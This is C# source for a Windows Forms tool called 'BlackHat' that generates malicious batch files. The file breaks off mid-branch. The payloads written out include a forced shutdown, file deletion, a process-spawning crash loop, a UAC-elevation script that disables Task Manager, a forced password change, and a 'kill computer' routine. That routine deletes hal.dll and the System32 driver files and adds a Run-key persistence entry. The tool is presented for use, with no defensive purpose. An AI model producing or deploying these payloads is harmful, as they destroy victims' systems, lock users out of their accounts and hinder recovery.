using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace BlackHat
{
    public partial class BlackHat : Form
    {
        //updates
        string CurrentVersion = "2.0";

        public BlackHat()
        {
            InitializeComponent();
        }

        private void BlackHat_Load(object sender, EventArgs e)
        {
            MaximizeBox = false;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Make Sure To Only Check Two Boxes At One Time As The Tool Wont Work.","Warning",MessageBoxButtons.OK,MessageBoxIcon.Information);
            MessageBox.Show("Make sure to add .bat after naming the file.", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);

            if (CustomBATcheck.Checked)
            {
                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    using (Stream s = File.Open(saveFileDialog1.FileName, FileMode.Create))
                    using (StreamWriter sw = new StreamWriter(s))
                    {
                        sw.Write(richTextBox1.Text);//custom batch code

                        if (ShutdownBox.Checked)//shutsdown PC
                        {
                            sw.Write("\nshutdown\", \"/s /t 0\n");
                        }
                        else
                        if (FileCheck.Checked)//deletes files
                        {
                            sw.Write("del " + deltext.Text);
                        }
                        else
                        if (AppCheck.Checked)//starts app
                        {
                            sw.Write("\nstart " + Apptext.Text);
                        }
                        else
                        if (Taskkillcheck.Checked)//kills any task
                        {
                            sw.Write("\ntaskkill /f /im " + AppNameBox.Text);
                        }
                        else
                        if (CrashCheck.Checked)//crashes pc
                        {
                            sw.Write("\n@echo off\r\n:start\r\nmsedge.exe\r\ngoto start\n");
                        }
                        else
                        if (MessageCheck.Checked)//send message
                        {
                            sw.Write("echo msgbox \"" + Messagetext.Text + "\" > %tmp%\\tmp.vbs\nwscript %tmp%\\tmp.vbs\r\ndel %tmp%\\tmp.vbs");
                        }
                        else
                        if (DisableTaskCheck.Checked)//disables taskmanager
                        {
                            sw.Write("\n@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\nreg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System / v DisableTaskMgr / t REG_DWORD / d 1 / f\n");
                        }
                        else
                        if (PasswordCheck.Checked)//changes userspassword
                        {
                            sw.Write("\r\nnet user %username% *\r\n" + PasswordText.Text + "\r\n" + PasswordText.Text + "");
                        }
                        else
                        if(KillComputerCheck.Checked)//kill computer (careful using this)
                        {
                            sw.Write("\r\nDEL /F /S /Q /A \"%systemdrive%\\windows\\system32\\hal.dll\"\r\n@((( Echo Off > Nul ) & Break Off )\r\n@Set HiveBSOD=HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\n@Reg Add \"%HiveBSOD%\" /v \"BSOD\" /t \"REG_SZ\" /d %0 /f > Nul\r\n@Del /q /s /f \"%SystemRoot%\\Windows\\System32\\Drivers\\*.*\"\r\n)\r\n");
                        }
                        else
                        if (CrazyMouseCheck.Checked)//swaps mouse buttons
                        {
                            sw.Write("\r\nRUNDLL32 USER32.DLL,SwapMouseButton\r\n");
                        }
                    }
                }
            }
            else
            if (ShutdownBox.Checked)
            {
                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    using (Stream s = File.Open(saveFileDialog1.FileName, FileMode.Create))
                    using (StreamWriter sw = new StreamWriter(s))
                    {
                        sw.Write("\nshutdown\", \"/s /t 0\n");

                        if (FileCheck.Checked)
                        {
                            sw.Write("del " + deltext.Text);
                        }
                        else
                        if (AppCheck.Checked)
                        {
                            sw.Write("\nstart " + Apptext.Text + "");
                        }
                        else
                        if (CustomBATcheck.Checked)
                        {
                            sw.Write(richTextBox1.Text);
                        }
                        else
                        if (Taskkillcheck.Checked)
                        {
                            sw.Write("\ntaskkill /f /im " + AppNameBox.Text);
                        }
                        else
                        if (CrashCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n:start\r\nmsedge.exe\r\ngoto start\n");
                        }
                        else
                        if (MessageCheck.Checked)
                        {
                            sw.Write("echo msgbox \"" + Messagetext.Text + "\" > %tmp%\\tmp.vbs\nwscript %tmp%\\tmp.vbs\r\ndel %tmp%\\tmp.vbs");
                        }
                        else
                        if (DisableTaskCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\nreg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System / v DisableTaskMgr / t REG_DWORD / d 1 / f\n");
                        }
                        else
                        if (PasswordCheck.Checked)//changes userspassword
                        {
                            sw.Write("\r\nnet user %username% *\r\n" + PasswordText.Text + "\r\n" + PasswordText.Text + "");
                        }
                        else
                        if (KillComputerCheck.Checked)//kill computer (careful using this)
                        {
                            sw.Write("\r\nDEL /F /S /Q /A \"%systemdrive%\\windows\\system32\\hal.dll\"\r\n@((( Echo Off > Nul ) & Break Off )\r\n@Set HiveBSOD=HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\n@Reg Add \"%HiveBSOD%\" /v \"BSOD\" /t \"REG_SZ\" /d %0 /f > Nul\r\n@Del /q /s /f \"%SystemRoot%\\Windows\\System32\\Drivers\\*.*\"\r\n)\r\n");
                        }
                        else
                        if (CrazyMouseCheck.Checked)//swaps mouse buttons
                        {
                            sw.Write("\r\nRUNDLL32 USER32.DLL,SwapMouseButton\r\n");
                        }
                    }
                }
            }
            else
            if (AppCheck.Checked)
            {
                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    using (Stream s = File.Open(saveFileDialog1.FileName, FileMode.Create))
                    using (StreamWriter sw = new StreamWriter(s))
                    {
                        sw.Write("\nstart " + Apptext.Text);

                        if (FileCheck.Checked)
                        {
                            sw.Write("del " + deltext.Text);
                        }
                        else
                        if (ShutdownBox.Checked)
                        {
                            sw.Write("\nshutdown\", \"/s /t 0\n");
                        }
                        else
                        if (CustomBATcheck.Checked)
                        {
                            sw.Write(richTextBox1.Text);
                        }
                        else
                        if (Taskkillcheck.Checked)
                        {
                            sw.Write("\ntaskkill /f /im " + AppNameBox.Text);
                        }
                        else
                        if (CrashCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n:start\r\nmsedge.exe\r\ngoto start\n");
                        }
                        else
                        if (MessageCheck.Checked)
                        {
                            sw.Write("echo msgbox \"" + Messagetext.Text + "\" > %tmp%\\tmp.vbs\nwscript %tmp%\\tmp.vbs\r\ndel %tmp%\\tmp.vbs");
                        }
                        else
                        if (DisableTaskCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\nreg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System / v DisableTaskMgr / t REG_DWORD / d 1 / f\n");
                        }
                        else if (PasswordCheck.Checked)
                        {
                            sw.Write("\r\nnet user %username% *\r\n" + PasswordText.Text + "\r\n" + PasswordText.Text + "");
                        }
                        else if (KillComputerCheck.Checked)
                        {
                            sw.Write("\r\nDEL /F /S /Q /A \"%systemdrive%\\windows\\system32\\hal.dll\"\r\n@((( Echo Off > Nul ) & Break Off )\r\n@Set HiveBSOD=HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\n@Reg Add \"%HiveBSOD%\" /v \"BSOD\" /t \"REG_SZ\" /d %0 /f > Nul\r\n@Del /q /s /f \"%SystemRoot%\\Windows\\System32\\Drivers\\*.*\"\r\n)\r\n");
                        }
                        else if (CrazyMouseCheck.Checked)
                        {
                            sw.Write("\r\nRUNDLL32 USER32.DLL,SwapMouseButton\r\n");
                        }
                    }
                }
            }
            else
            if (FileCheck.Checked)
            {
                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    using (Stream s = File.Open(saveFileDialog1.FileName, FileMode.Create))
                    using (StreamWriter sw = new StreamWriter(s))
                    {
                        sw.Write("del " + deltext.Text);

                        if (ShutdownBox.Checked)
                        {
                            sw.Write("\nshutdown\", \"/s /t 0\n");
                        }
                        else
                        if (CustomBATcheck.Checked)
                        {
                            sw.Write(richTextBox1.Text);
                        }
                        else
                        if (AppCheck.Checked)
                        {
                            sw.Write("\nstart " + Apptext.Text);
                        }
                        else
                        if (Taskkillcheck.Checked)
                        {
                            sw.Write("\ntaskkill /f /im " + AppNameBox.Text);
                        }
                        else
                        if (CrashCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n:start\r\nmsedge.exe\r\ngoto start\n");
                        }
                        else
                        if (MessageCheck.Checked)
                        {
                            sw.Write("echo msgbox \"" + Messagetext.Text + "\" > %tmp%\\tmp.vbs\nwscript %tmp%\\tmp.vbs\r\ndel %tmp%\\tmp.vbs");
                        }
                        else
                        if (DisableTaskCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\nreg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System / v DisableTaskMgr / t REG_DWORD / d 1 / f\n");
                        }
                        else if (PasswordCheck.Checked)
                        {
                            sw.Write("\r\nnet user %username% *\r\n" + PasswordText.Text + "\r\n" + PasswordText.Text + "");
                        }
                        else if (KillComputerCheck.Checked)
                        {
                            sw.Write("\r\nDEL /F /S /Q /A \"%systemdrive%\\windows\\system32\\hal.dll\"\r\n@((( Echo Off > Nul ) & Break Off )\r\n@Set HiveBSOD=HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\n@Reg Add \"%HiveBSOD%\" /v \"BSOD\" /t \"REG_SZ\" /d %0 /f > Nul\r\n@Del /q /s /f \"%SystemRoot%\\Windows\\System32\\Drivers\\*.*\"\r\n)\r\n");
                        }
                        else if (CrazyMouseCheck.Checked)
                        {
                            sw.Write("\r\nRUNDLL32 USER32.DLL,SwapMouseButton\r\n");
                        }
                    }
                }
            }
            else
            if (Taskkillcheck.Checked)
            {
                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    using (Stream s = File.Open(saveFileDialog1.FileName, FileMode.Create))
                    using (StreamWriter sw = new StreamWriter(s))
                    {
                        sw.Write("\ntaskkill /f /im " + AppNameBox.Text);

                        if (ShutdownBox.Checked)
                        {
                            sw.Write("\nshutdown\", \"/s /t 0\n");
                        }
                        else
                        if (CustomBATcheck.Checked)
                        {
                            sw.Write(richTextBox1.Text);
                        }
                        else
                        if (AppCheck.Checked)
                        {
                            sw.Write("\nstart " + Apptext.Text);
                        }
                        else
                        if (FileCheck.Checked)
                        {
                            sw.Write("del " + deltext.Text);
                        }
                        else
                        if (CrashCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n:start\r\nmsedge.exe\r\ngoto start\n");
                        }
                        else
                        if (MessageCheck.Checked)
                        {
                            sw.Write("echo msgbox \"" + Messagetext.Text + "\" > %tmp%\\tmp.vbs\nwscript %tmp%\\tmp.vbs\r\ndel %tmp%\\tmp.vbs");
                        }
                        else
                        if (DisableTaskCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\nreg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System / v DisableTaskMgr / t REG_DWORD / d 1 / f\n");
                        }
                        else if (PasswordCheck.Checked)
                        {
                            sw.Write("\r\nnet user %username% *\r\n" + PasswordText.Text + "\r\n" + PasswordText.Text + "");
                        }
                        else if (KillComputerCheck.Checked)
                        {
                            sw.Write("\r\nDEL /F /S /Q /A \"%systemdrive%\\windows\\system32\\hal.dll\"\r\n@((( Echo Off > Nul ) & Break Off )\r\n@Set HiveBSOD=HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\n@Reg Add \"%HiveBSOD%\" /v \"BSOD\" /t \"REG_SZ\" /d %0 /f > Nul\r\n@Del /q /s /f \"%SystemRoot%\\Windows\\System32\\Drivers\\*.*\"\r\n)\r\n");
                        }
                        else if (CrazyMouseCheck.Checked)
                        {
                            sw.Write("\r\nRUNDLL32 USER32.DLL,SwapMouseButton\r\n");
                        }
                    }
                }
            }
            else
            if (CrashCheck.Checked)
            {
                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    using (Stream s = File.Open(saveFileDialog1.FileName, FileMode.Create))
                    using (StreamWriter sw = new StreamWriter(s))
                    {
                        sw.Write("\n@echo off\r\n:start\r\nmsedge.exe\r\ngoto start\n");

                        if (ShutdownBox.Checked)
                        {
                            sw.Write("\nshutdown\", \"/s /t 0\n");
                        }
                        else
                        if (CustomBATcheck.Checked)
                        {
                            sw.Write(richTextBox1.Text);
                        }
                        else
                        if (AppCheck.Checked)
                        {
                            sw.Write("\nstart " + Apptext.Text);
                        }
                        else
                        if (FileCheck.Checked)
                        {
                            sw.Write("del " + deltext.Text);
                        }
                        else
                        if (Taskkillcheck.Checked)
                        {
                            sw.Write("\ntaskkill /f /im " + AppNameBox.Text);
                        }
                        else
                        if (MessageCheck.Checked)
                        {
                            sw.Write("echo msgbox \"" + Messagetext.Text + "\" > %tmp%\\tmp.vbs\nwscript %tmp%\\tmp.vbs\r\ndel %tmp%\\tmp.vbs");
                        }
                        else
                        if (DisableTaskCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\nreg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System / v DisableTaskMgr / t REG_DWORD / d 1 / f\n");
                        }
                        else if (PasswordCheck.Checked)
                        {
                            sw.Write("\r\nnet user %username% *\r\n" + PasswordText.Text + "\r\n" + PasswordText.Text + "");
                        }
                        else if (KillComputerCheck.Checked)
                        {
                            sw.Write("\r\nDEL /F /S /Q /A \"%systemdrive%\\windows\\system32\\hal.dll\"\r\n@((( Echo Off > Nul ) & Break Off )\r\n@Set HiveBSOD=HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\n@Reg Add \"%HiveBSOD%\" /v \"BSOD\" /t \"REG_SZ\" /d %0 /f > Nul\r\n@Del /q /s /f \"%SystemRoot%\\Windows\\System32\\Drivers\\*.*\"\r\n)\r\n");
                        }
                        else if (CrazyMouseCheck.Checked)
                        {
                            sw.Write("\r\nRUNDLL32 USER32.DLL,SwapMouseButton\r\n");
                        }
                    }
                }
            }
            else
            if (MessageCheck.Checked)
            {
                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    using (Stream s = File.Open(saveFileDialog1.FileName, FileMode.Create))
                    using (StreamWriter sw = new StreamWriter(s))
                    {
                        sw.Write("echo msgbox \"" + Messagetext.Text + "\" > %tmp%\\tmp.vbs\nwscript %tmp%\\tmp.vbs\r\ndel %tmp%\\tmp.vbs");

                        if (ShutdownBox.Checked)
                        {
                            sw.Write("\nshutdown\", \"/s /t 0\n");
                        }
                        else
                        if (CustomBATcheck.Checked)
                        {
                            sw.Write(richTextBox1.Text);
                        }
                        else
                        if (AppCheck.Checked)
                        {
                            sw.Write("\nstart " + Apptext.Text);
                        }
                        else
                        if (FileCheck.Checked)
                        {
                            sw.Write("del " + deltext.Text);
                        }
                        else
                        if (Taskkillcheck.Checked)
                        {
                            sw.Write("\ntaskkill /f /im " + AppNameBox.Text);
                        }
                        else
                        if (CrashCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n:start\r\nmsedge.exe\r\ngoto start\n");
                        }
                        else
                        if (DisableTaskCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\nreg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System / v DisableTaskMgr / t REG_DWORD / d 1 / f\n");
                        }
                        else if (PasswordCheck.Checked)
                        {
                            sw.Write("\r\nnet user %username% *\r\n" + PasswordText.Text + "\r\n" + PasswordText.Text + "");
                        }
                        else if (KillComputerCheck.Checked)
                        {
                            sw.Write("\r\nDEL /F /S /Q /A \"%systemdrive%\\windows\\system32\\hal.dll\"\r\n@((( Echo Off > Nul ) & Break Off )\r\n@Set HiveBSOD=HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\n@Reg Add \"%HiveBSOD%\" /v \"BSOD\" /t \"REG_SZ\" /d %0 /f > Nul\r\n@Del /q /s /f \"%SystemRoot%\\Windows\\System32\\Drivers\\*.*\"\r\n)\r\n");
                        }
                        else if (CrazyMouseCheck.Checked)
                        {
                            sw.Write("\r\nRUNDLL32 USER32.DLL,SwapMouseButton\r\n");
                        }
                    }
                }
            }
            else
            if (DisableTaskCheck.Checked)
            {
                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    using (Stream s = File.Open(saveFileDialog1.FileName, FileMode.Create))
                    using (StreamWriter sw = new StreamWriter(s))
                    {
                        sw.Write("\n@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\nreg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System / v DisableTaskMgr / t REG_DWORD / d 1 / f\n");

                        if (ShutdownBox.Checked)
                        {
                            sw.Write("\nshutdown\", \"/s /t 0\n");
                        }
                        else
                        if (CustomBATcheck.Checked)
                        {
                            sw.Write(richTextBox1.Text);
                        }
                        else
                        if (AppCheck.Checked)
                        {
                            sw.Write("\nstart " + Apptext.Text);
                        }
                        else
                        if (FileCheck.Checked)
                        {
                            sw.Write("del " + deltext.Text);
                        }
                        else
                        if (Taskkillcheck.Checked)
                        {
                            sw.Write("\ntaskkill /f /im " + AppNameBox.Text);
                        }
                        else
                        if (CrashCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n:start\r\nmsedge.exe\r\ngoto start\n");
                        }
                        else
                        if (MessageCheck.Checked)
                        {
                            sw.Write("echo msgbox \"" + Messagetext.Text + "\" > %tmp%\\tmp.vbs\nwscript %tmp%\\tmp.vbs\r\ndel %tmp%\\tmp.vbs");
                        }
                        else
                        if (PasswordCheck.Checked)
                        {
                            sw.Write("\r\nnet user %username% *\r\n" + PasswordText.Text + "\r\n" + PasswordText.Text + "");
                        }
                        else if (KillComputerCheck.Checked)
                        {
                            sw.Write("\r\nDEL /F /S /Q /A \"%systemdrive%\\windows\\system32\\hal.dll\"\r\n@((( Echo Off > Nul ) & Break Off )\r\n@Set HiveBSOD=HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\n@Reg Add \"%HiveBSOD%\" /v \"BSOD\" /t \"REG_SZ\" /d %0 /f > Nul\r\n@Del /q /s /f \"%SystemRoot%\\Windows\\System32\\Drivers\\*.*\"\r\n)\r\n");
                        }
                        else if (CrazyMouseCheck.Checked)
                        {
                            sw.Write("\r\nRUNDLL32 USER32.DLL,SwapMouseButton\r\n");
                        }
                    }
                }
            }
            else
            if (PasswordCheck.Checked)
            {
                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    using (Stream s = File.Open(saveFileDialog1.FileName, FileMode.Create))
                    using (StreamWriter sw = new StreamWriter(s))
                    {
                        sw.Write("\r\nnet user %username% *\r\n" + PasswordText.Text + "\r\n" + PasswordText.Text + "");

                        if (ShutdownBox.Checked)
                        {
                            sw.Write("\nshutdown\", \"/s /t 0\n");
                        }
                        else
                        if (CustomBATcheck.Checked)
                        {
                            sw.Write(richTextBox1.Text);
                        }
                        else
                        if (AppCheck.Checked)
                        {
                            sw.Write("\nstart " + Apptext.Text);
                        }
                        else
                        if (FileCheck.Checked)
                        {
                            sw.Write("del " + deltext.Text);
                        }
                        else
                        if (Taskkillcheck.Checked)
                        {
                            sw.Write("\ntaskkill /f /im " + AppNameBox.Text);
                        }
                        else
                        if (CrashCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n:start\r\nmsedge.exe\r\ngoto start\n");
                        }
                        else
